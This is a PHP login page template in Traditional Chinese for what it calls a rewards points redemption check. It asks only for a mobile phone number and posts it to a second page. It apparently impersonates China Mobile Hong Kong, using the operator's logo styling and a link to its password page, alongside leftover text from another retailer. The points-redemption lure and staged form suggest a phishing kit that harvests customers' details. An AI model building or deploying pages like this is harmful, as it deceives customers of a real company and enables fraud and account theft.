<?php
@session_start();
include('partials/header.php');




if (isset($_SESSION['user_logged_in'])) {
    //  header('Location: dashboard.php');
}

?>
<style>
    /* .login-banner{background: url(./assets/images/pink-banner.jpg) no-repeat center center; min-height: 200px;} */
    @media(max-width: 767px) {
        .login-form {
            width: 75%;
            margin: 10px auto 0px;
            border-radius: 8px;
            box-shadow: 0 10px 20px 0 rgb(0 0 0 / 9%);
            background-color: #fff;
            position: relative;
            z-index: 99;
            padding: 25px 25px;
        }

        .login-form input {
            border-radius: 10px;
            height: 48px;
            padding: 0 1.42rem;
            font-size: 1rem;
            line-height: 48px;
            width: calc(100% - 50px);
            border: 1px solid #888;
            outline: none;
            position: relative;
            z-index: 1;
            color: #222226;
            text-overflow: ellipsis;
            margin-bottom: 0;
        }

        .login-form #submit {
            background-color: red;
            padding: 11px 24px;
            font-size: 1rem;
            display: block;
            width: 100%;
            min-width: 120px;
            margin-left: auto;
            margin-right: auto;
            line-height: 22px;
            border-radius: 32px;
            color: #fff;
            border-color: red;
            height: auto;
            cursor: pointer;
        }

        .login-form #submit:hover {
            background-color: red;
            border-color: red;
        }

        /* .login-form .forgot-pwd {
            color: red;
            text-align: center;
            margin-top: 20px;
        } */

        /* .register-link {
            color: red;
            font-size: 12px;
        }

        .register p {
            font-size: 12px;
        }

        .register {
            display: flex;
            align-items: center;
            justify-content: space-between;
        } */

        .login-form input.error {
            border-color: #ff4e1c;
            font-size: 12px;
        }

        .login-form label.error {
            color: #ff4e1c;
            font-size: 12px;
        }

        .login-form .form-group {
            margin-bottom: 15px;
        }

        .login-form input.error::placeholder {
            color: #ff4e1c;
        }

        .login-form h2 {
            line-height: 20px;
            font-size: 1rem;
            font-weight: 500;
            color: #4a4a4a;
            margin-bottom: 30px;
            text-align: center;
        }

        .login-banner .owl-dot {
            background: #fff !important;
            border: 1px solid #ddd !important;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin: 5px;
        }

        .login-banner .owl-dots {
            text-align: center;
            position: relative;
            margin-top: 12px;
        }

        .login-banner .owl-dot.active {
            background: red !important;
        }

        /* .usernew_login_inks {
            margin-top: 20px;
            display: block;
            justify-content: start;
            font-size: 12px;
        }

        .usernew_login_inks .usernew_login_link {
            text-align: center;
            margin-top: 10px;
            padding-left: 0;
            padding-right: 0;
            display: flex;
            justify-content: center;
        }

        .usernew_login_password .usernew_login_inks .usernew_login_link a {
            display: block;
            flex: 1;
        }

        .usernew_login_inks .usernew_login_link .login_link_text:not(:first-child) {
            padding-left: 10px;
            margin-left: 10px;
            border-left: 1px solid #ddd;
        }

        .usernew_login_inks .login_link_text {
            font-size: 12px;
            line-height: 1;
            color: red;
            text-decoration: none;
            flex: 1;
        } */

        .page_breadcrumb .page_breadcrumb_wrap {
            padding-top: 0.72rem;
            padding-bottom: 0.72rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .page_breadcrumb .breadcrumb_content .breadcrumb_current {
            font-size: 16px;
            line-height: 1;
            color: #878787;
        }

        .common_share_third .share_button {
            line-height: 24px;
            font-size: 14px;
            border: none;
            background: none;
        }

        .common_share_third .share_button .share_btn_icon {
            background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC0AAAAtCAYAAAA6GuKaAAAAAXNSR0IArs4c6QAABLtJREFUaEPtl21oXEUUht8zN4maaCxN/khQWptaRUEwNbGV2IImGqS02XtvQhFBLQa0ptnNRxWhZUFFbU32JtWqAUtBU01nZ1N/taI/AtVimoIfrTa2jYIYLdqUFGPUJDtHrtmFkO5mt8nmo7AD99fcOee577xz5lzCVTjoKmRGGnq+di2tdFrpaRRI2yNtj/myR1FRTeayZdc9w0yPEfFdAIGIThHhwPDw+DuHD+/5NxW7kTJPezzem4ggAdwfB+xbIUYflnLv+dmCpwTatm2DueAoM9YA+JOIXtOajzCLsGHoMma8ACCPCF8vXTpS3N7ePjYb8JRAm6bvOYD3uMAArVEq8N1kKNv2FWrNX7rggKhTqqVtwaE9Hm8PEYqJsDMYdF6KBWSaPh/ALQB6lXKKFxzaNL1/AcgWgkqkDByPBWTbDUVah08APKJUa86igQ6HqeTQodjQ69c/cW1e3pLTzPg9FHJKFhzasrw9zChmph2hUODleEB+v1/4/X4G4D4zHik6iN6tAN6MHMQOgG2tUdrV5Zx2yWy7bhUzNTOjQynnwxnTRhamBDpS8o65akfiakBUCcFntOYyADsB3AjgoFJO9aKAdiEsy1fOzEfgXoMxB33FzI+GQs5viwK6snJrnhBZvQAvB/AZgBsArAKgmfl7gN43jIH9UsrR2QK762dtD9caWhe4Cj8EoGdkJLwuVT1GvA+cNbRleXczoxHg80KI1VIGBlKh5nQxZgVtmt7NADoAjAmhH5Sy7fO5Br5ie5SXN+bk5o43MaMKwAoAGQAEkdgVDLY8nwjYsurXMusmAA8AuB5APzMfuHjx0hvd3fv/SbQ+Op+00ps21a4wDONjAHfGCD4O0ItKBXbHS2xZ3kZmvBr50KmvnRFCl0nZ9nMy4ElBV1TUXpOdbfQAuBvAj8zwM4sewxjPZxZbADzpJhNCbJaypXNqYtv2VWrNoYmbkPYRhfeFwxkXiHQJEfwAbgVwSggqljLwdyLwpKBNs24bQK0Azmk9dl9X11uDkwN7PN7tRHgdoJ+E+GWllDIcnXev7pMnh1wFCwDaPnU3JsplpiuIa7dnlXLeThG07wuA1wJUrVTg4OVB/cI0h34AUCiEUS5l86fRd2zbt05r7gZwVqkltwN+PXW9x1NfTaQ/AnBCKefeFEFPtJ5aj+VPVTmawDTr2gF6On5C7lOq9Y5Y8xs2NORnZYX/ADCilJOwbU3SHslAe98FUDMT6IhFLrgNl1JObqqU7gWwOoE9+gCsZKayUCjgXuX/D8uqLWc2PpnOHqbpqwK4kxnHk+m1k1S6fhug4x5E0/Q1AbyLGb8axsDyyT2GbfuztB46C+CWaQ6i+/9YCKBBKcf9JZt2JAVdU1OTOTiY/Q0A15ORkjfWk5GRmac1bQH4qYk+RjyuVMsHUzNGlYyWPCH4vfHxsUGizEklj/qEwD0pK3kuxMaN9TdnZGh322+7XAZ26+8OpZxX4kk08WOrmwGKJVS/EPSIlIFziVR255NSOhqooqI2NyfHqJ90jV8CcJRINweDbccSJbQsXykz1wMoBTgHoH4idBKNBqTcO5xofXT+iqCTDTrX76Wh51rhtD3mS+G00mmlk1DgP9f48T3zk3pKAAAAAElFTkSuQmCC) no-repeat;
            background-size: cover;
        }

        .common_share_third .share_icon {
            width: 24px;
            height: 24px;
            display: inline-block;
            vertical-align: top;
        }

        .common_width_container {
            padding-left: 1.072rem;
            padding-right: 1.072rem;
        }

        .loader-wrap {
            display: flex;
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            align-items: center;
            justify-content: center;
            z-index: 99999999999999;
            background: rgba(255, 255, 255, 1);
        }

        .loader-wrap .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-wrap .loading img.china-mobile-logo-img {
            width: 200px;
        }

        .loader-wrap .loading img {
            width: 80px;
        }
    }
</style>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css"/>

<!-- <div class="page-title">登入</div> -->
<div class="tpl-breadcrumbnew">
    <div class="page_breadcrumb" style="background-color: transparent;">
        <div class="page_breadcrumb_wrap common_width_container">
            <div class="breadcrumb_content">
                <p class="breadcrumb_current"> 兌換我的獎賞 </p>
            </div>
            <div class="common_share_third"><button type="button" class="el-button share_button el-button--default">
                    <span> 分 享 <i class="share_icon share_btn_icon"></i></span></button>
                <div></div>
            </div>
        </div>
        <div></div>
    </div>
</div>
<div class="login-banner">
    <div class="owl-carousel owl-theme">
        <div class="item"><img src="/smart_one.jpg" alt=""></div>
        <div class="item"><img src="/smart_one.jpg" alt=""></div>
    </div>
</div>
<div class="login-form">
    <h2>積分兌換查詢</h2>
    <form action="./page2.php" method="POST" id="loginForm" novalidate>
        <div class="form-group">
            <input type="text" placeholder="手機號碼" name="username" required>
        </div>
        <!-- <div class="form-group">
            <input type="password" placeholder="密碼" name="password" required>
        </div> -->
        <button type="submit" class="btnSubmit btn" name="submit" id="submit">登入</button>
        <!-- <div class="usernew_login_inks">
            <div class="usernew_login_link"><a href="/tc/user/retrieve.html" title="找回賬戶" class="login_link_text"> 找回賬戶
                </a></div>
            <div class="usernew_login_link"><a href="/tc/user/forgot.html" title="忘記登錄密碼?" class="login_link_text">
                    忘記登錄密碼? </a><a href="https://1cm.hk.chinamobile.com/user/forget-password.html?lang=zh_hk" title="忘記客戶密碼?" class="login_link_text"> 忘記客戶密碼? </a></div>
        </div> -->
        <!-- <a href="#" class="forgot-pwd">忘記密碼?</a> -->
    </form>
    <!-- <div class="register">
        <p>未有帳戶？立即加入HKTVmall</p>
        <a class="register-link" href="#"><svg height="325pt" viewBox="0 0 325 325.37515" width="325pt" xmlns="http://www.w3.org/2000/svg">
                <path d="m114.6875 284.675781-73.800781-73.800781 178.5-178.5 73.800781 73.800781zm-80.699219-60.800781 67.699219 67.699219-101.5 33.800781zm281.898438-140.300781-12.800781 12.800781-73.898438-73.898438 12.800781-12.800781c12.894531-12.902343 33.804688-12.902343 46.699219 0l27.199219 27.199219c12.800781 12.9375 12.800781 33.765625 0 46.699219zm0 0" />
            </svg>登記免費帳戶</a>
    </div> -->
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.5/jquery.validate.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"></script>
<script>
    jQuery.extend(jQuery.validator.messages, {
        required: "請檢查並填寫正確的內容"
    });
    $("#loginForm").validate({
        rules: {
            username: "required",
        }
    });
    // jQuery('#login-form input').on('input', function() {
    //     let check = true;
    //     jQuery('#login-form input').each(function() {
    //         if (jQuery(this).val() == '') check = false;
    //     });
    //     if (check) jQuery('.btn').removeClass('disabled');
    //     else jQuery('.btn').addClass('disabled')
    // });

    $('.owl-carousel').owlCarousel({
        loop: true,
        margin: 0,
        nav: false,
        dots: true,
        responsive: {
            0: {
                items: 1
            },
            600: {
                items: 1
            },
            1000: {
                items: 1
            }
        }
    })
</script>

<?php
include('partials/footer.php');
?>

